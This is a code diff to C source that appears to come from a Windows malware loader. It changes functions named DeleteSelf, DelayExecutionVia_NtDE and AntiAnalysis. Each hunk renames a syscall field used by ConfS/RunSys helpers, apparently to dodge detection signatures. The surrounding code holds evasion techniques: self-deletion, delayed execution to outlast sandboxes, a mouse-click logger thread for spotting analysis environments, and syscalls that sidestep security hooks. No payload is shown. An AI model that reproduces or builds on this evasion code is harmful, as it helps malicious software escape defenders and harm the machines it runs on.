@@ -114,7 +114,7 @@ BOOL DeleteSelf() {
 	PRINTW(L"[+] DONE \n");
 #endif
 
-	ConfS(g_Sys.NtClose.wSystemCall);
+	ConfS(g_Sys.NtClose.wSysC);
 	RunSys(hFile);
 
 	//--------------------------------------------------------------------------------------------------------------------------
@@ -147,7 +147,7 @@ BOOL DeleteSelf() {
 	PRINTW(L"[+] DONE \n");
 #endif
 
-	ConfS(g_Sys.NtClose.wSystemCall);
+	ConfS(g_Sys.NtClose.wSysC);
 	RunSys(hFile);
 
 	//--------------------------------------------------------------------------------------------------------------------------
@@ -175,7 +175,7 @@ BOOL DelayExecutionVia_NtDE(FLOAT ftMinutes) {
 	_T0 = g_Api.pGetTickCount64();
 
 	// Sleeping for 'dwMilliSeconds' ms
-	ConfS(g_Sys.NtDelayExecution.wSystemCall);
+	ConfS(g_Sys.NtDelayExecution.wSysC);
 	if ((STATUS = RunSys(FALSE, &DelayInterval)) != 0x00 && STATUS != STATUS_TIMEOUT) {
 #if DEBUG
 		PRINTA("[!] NtDelayExecution Failed With Error : 0x%0.8X \n", STATUS);
@@ -217,7 +217,7 @@ BOOL AntiAnalysis(DWORD dwMilliSeconds) {
 #endif
 
 		// Creating a thread that runs 'MouseClicksLogger' function
-		ConfS(g_Sys.NtCreateThreadEx.wSystemCall);
+		ConfS(g_Sys.NtCreateThreadEx.wSysC);
 		if ((STATUS = RunSys(&hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, MouseClicksLogger, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
 #if DEBUG
 			PRINTA("[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n", STATUS);
@@ -226,7 +226,7 @@ BOOL AntiAnalysis(DWORD dwMilliSeconds) {
 		}
 
 		// Waiting for the thread for 'dwMilliSeconds'
-		ConfS(g_Sys.NtWaitForSingleObject.wSystemCall);
+		ConfS(g_Sys.NtWaitForSingleObject.wSysC);
 		if ((STATUS = RunSys(hThread, FALSE, &DelayInterval)) != 0 && STATUS != STATUS_TIMEOUT) {
 #if DEBUG
 			PRINTA("[!] NtWaitForSingleObject Failed With Error : 0x%0.8X \n", STATUS);
@@ -234,7 +234,7 @@ BOOL AntiAnalysis(DWORD dwMilliSeconds) {
 			return FALSE;
 		}
 
-		ConfS(g_Sys.NtClose.wSystemCall);
+		ConfS(g_Sys.NtClose.wSysC);
 		if ((STATUS = RunSys(hThread)) != 0) {
 #if DEBUG
 			PRINTA("[!] NtClose Failed With Error : 0x%0.8X \n", STATUS);
